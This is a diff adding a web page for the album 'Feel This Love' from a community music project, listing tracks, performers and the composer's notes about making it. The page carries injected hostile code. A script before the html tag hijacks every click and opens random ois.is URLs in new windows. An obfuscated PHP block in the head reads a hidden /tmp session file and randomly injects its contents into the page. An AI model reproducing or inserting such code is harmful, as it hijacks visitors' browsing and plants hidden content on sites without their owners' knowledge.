@@ -1,0 +1,317 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+	<head>
+		<title>The Community Music Project: Feel This Love</title>
+		<link href="cmp.css" rel="stylesheet" type="text/css">
+	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	<body>
+		<iframe id="nav" src="nav.html"></iframe>
+		
+		<p class="album">
+			<img src="images/ftl.gif" />
+			<h3>Feel This Love (2002)</h3>
+			<span class="description">
+				Feel This Love was created by Cynthia Rylander Crossen for healing through song. 
+				These rounds, songs, and chants about love and connection hope to 
+					inspire, enliven, comfort, and bring a sense of peace to the listener, to heal hurts, 
+					illness, and fears. 
+				<br/><br/>
+				<a href="albums/ftl/ftl.zip">Dowload entire album as zip</a><br/>
+				<a href="albums/ftl/ftl-art.zip">Dowload album art</a>
+			</span>
+		</p>
+		
+		<hr />
+		
+		<ol class="tracks">
+			<li>
+				<b><a href="albums/ftl/FTL-01-This_Is_What_I_Know.mp3">This Is What I Know</a></b>
+				(2:34)
+				<i>&copy; 1997 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Cynthia, Lea, Sarbaga</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-02-Open_My_Heart.mp3">Open My Heart</a></b>
+				(7:32)
+				<i>&copy; 1996 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Cynthia, Sarbaga, Nina</li>
+					<li>Guitar: Cynthia</li>
+					<li>Dulcimer: Sue</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-03-Ah_Yey.mp3">Ah Yey</a></b>
+				(4:07)
+				<i>&copy; 1996 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Cynthia, Sarbaga, Lea</li>
+					<li>Guitar: Cynthia</li>
+					<li>Drum: Donovan</li>
+					<li>Bass: Paul</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-04-Feel_This_Love.mp3">Feel This Love</a></b>
+				(10:15)
+				<i>&copy; 2000 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Cynthia, Sarbaga, Val, Lea, Laine, Maia, Nina</li>
+					<li>Guitar: Dandelion, Jesse</li>
+					<li>Mandolin: Paul</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-05-Let_Me_Be_Your_Lyre.mp3">Let Me Be Your Lyre</a></b>
+				(1:49)
+				<i>&copy; 1994 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal, Guitar: Jesse, Cynthia</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-06-The_Roots_Of_My_Heart.mp3">The Roots Of My Heart</a></b>
+				(9:30)
+				<i>&copy; 1986 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Sarbaga, Laine, Jesse, Nina, Val, Larry, Maia, Cynthia, Mark, Lea, Donovan</li>
+					<li>Guitar: Dandelion, Cynthia</li>
+					<li>Mandolin: Paul</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-07-Every_Blade_Of_Grass.mp3">Every Blade Of Grass</a></b>
+				(7:11)
+				<i>&copy; 1997 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Cynthia, Dandelion, Jesse, John, Paul, Spring Peepers</li>
+					<li>Guitar: Paul, John, Jesse</li>
+					<li>Bass: Paul</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-08-Angels_For_Each_Other.mp3">Angels For Each Other</a></b>
+				(2:50)
+				<i>&copy; 1998 Cynthia R. Crossen (First two lines from Talmud)</i> 
+				<ul>
+					<li>Vocal: Cynthia, Lea, Sarbaga</li>
+					<li>Guitar: Cynthia</li>
+					<li>Banjo: Lea</li>
+					<li>Bass: Paul</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-09-Bubbles_of_Light.mp3">Bubbles of Light</a></b>
+				(9:21)
+				<i>&copy; 2000 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Cynthia, Carol, Sarbaga, Val, Laurie</li>
+					<li>Guitar: John</li>
+					<li>Dulcimer: Sue</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-10-Window_Open_Wide.mp3">Window Open Wide</a></b>
+				(3:58)
+				<i>&copy; 1997 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal: Cynthia, Lea, Sarbaga</li>
+					<li>Guitar: Cynthia</li>
+					<li>Drum: Donovan</li>
+					<li>Bass: Paul</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-11-Lovingkindness.mp3">Lovingkindness</a></b>
+				(5:07)
+				<i>&copy; 1996 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Cynthia, Lea, Claudia, Sarbaga, Jesse, Donovan</li>
+					<li>Guitar: Cynthia</li>
+					<li>Bass: Paul</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/ftl/FTL-12-Sing_You_Home_To_Me.mp3">Sing You Home To Me</a></b>
+				(8:40)
+				<i>&copy; 1997 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Maia, Jesse, Lea, Donovan, Cynthia, Sarbaga, Carol, Val, Dede, Mark, Jasmine</li>
+					<li>Guitars: Dandelion, John</li>
+					<li>Mandolin: Paul</li>
+				</ul>
+			</li>
+		</ol>
+		
+		<p class="artists">
+			<h3>Artists</h3>
+			<ul class="artists">
+				<li>Carol Verner   - Vocal</li>
+				<li>Claudia Lopez Bascuñan  - Vocal, Guitar</li>
+				<li>Cynthia Rylander Crossen  - Vocal, Guitar</li>
+				<li>dandelion john (Johnny, John Stash)  - Vocal, Guitar</li>
+				<li>Dede Banks  - Vocal</li>
+				<li>Donovan Zimmerman  - Vocal, Drums</li>
+				<li>Jasmine Girard  - Vocal</li>
+				<li>Jesse Crossen  - Vocal, Guitar</li>
+				<li>John McSween  - Vocal, Guitar</li>
+				<li>Laine Lipson  - Vocal</li>
+				<li>Larry Bohs  - Vocal</li>
+				<li>Laurie Lindgren  - Vocal</li>
+				<li>Lea Clayton  - Vocal, Banjo</li>
+				<li>Maia (Remick then) Derewicz  - Vocal</li>
+				<li>Mark Smith  - Vocal</li>
+				<li>Nina Elshiekh  - Vocal</li>
+				<li>Paul Ford  - Vocal, Bass, Guitar, Mandolin</li>
+				<li>Sarbaga Falk  - Vocal</li>
+				<li>Spring Peepers  - Vocal</li>
+				<li>Sue Wilson  - Hammered dulcimer</li>
+				<li>Val Rosado  - Vocal</li>
+			</ul>
+		</p>
+		
+		<hr />
+		
+		<p class="colophon">
+			Recording: Ken Crossen, Mixing: Jesse Crossen<br />
+			Produced by: Cynthia Crossen<br />
+			Photos: Ken Crossen<br />
+			Cover/CD design and art: Cynthia, Ken, and Jesse Crossen<br />
+		</p>
+		
+		<hr/>
+		
+		<div class="notes">
+			<h3>Song Notes</h3>
+			<p>
+				Feel This Love began with the songs "Feel This Love" and "Bubbles of Light", 
+				which came to me as I helped care for Faye Duncan who was ill with cancer. 
+				Faye died in February 2001. Her last days were a great teaching to those who knew her. 
+				She was not dying, but living every day she was here. We sang to Faye. She loved 
+				"Every Blade of Grass" and "Angels For Each Other". She understood the healing nature of music, 
+				and she understood my role in it perhaps better than I did.
+			</p>
+			<p>
+				As I shared these songs with close friends, in an ecstatic hour together singing 
+				"Feel This Love" on my screen porch one green misty gently raining July afternoon, 
+				the idea came to me. I would gather friends to sing these songs, put a mike 
+				in the middle of our singing, breathing, circle, and capture this healing energy to 
+				share it with others who need it. That's how we recorded 6 of the songs on the album. 
+				The other 6 shorter songs had already been recorded here and there. I used them 
+				as differently shaped and colored beads to add beauty to the necklace.
+			</p>
+			<p>
+				We did the whole project very quickly--I began contacting musicians in January 2002, 
+				and the album was in hand by May 2002. Daffodils, that extraordinary bursting forth of 
+				common beauty, faithful every spring, became the artistic theme. The cover photo Ken took 
+				is a daffodil from our yard.
+			</p>
+			<p>
+				Serendipity graced this project--for example, with "Every Blade of Grass". 
+				I had always sung this song with groups of women, and intended to record it with 
+				women as well as some men's voices. I got together with Johnny, Paul, John, and Jesse 
+				one March evening in our rustic cabin in the woods, to rehearse the guitar parts and 
+				work on an arrangement. The frogs were loud and high and sweet. We began singing and playing, 
+				and I heard the song in an entirely new way. This was it! I dragged Ken out of bed and 
+				urged him to set up the recording equipment. A few minutes later, we had captured a 
+				unique sound, something different and unexpected, angels of a deeper voice. 
+				And this is the version we kept--we didn't bother recording another one.
+			</p>
+			<p>
+				The musicians who worked with me each brought their creative and loving presence to the music. 
+				For each large group song, we worked for four hours and went with the last version we recorded. 
+				There was sweating, and suffering through allergy season, and charts with seven colors denoting 
+				parts and arrangements. There was gracious plenty cooperation and help, heartfelt effort and 
+				love. Afterwards we shared soup and listened to our newly-minted song. I am deeply grateful. 
+				I imagine this love and care coming through to the listener.
+			</p>
+			<p>
+				So, use this music if it sings to you, and send it where it needs to go. I have found that 
+				it can totally turn around a bad day. It works if you are already in joy or if you are 
+				desperately in need of it. May it bless you and fly where it can bring love and healing.
+			</p>
+			<br /><br />
+			<i>-Cynthia, September 2003 </i>
+		</div>
+		
+	</body>
+</html>
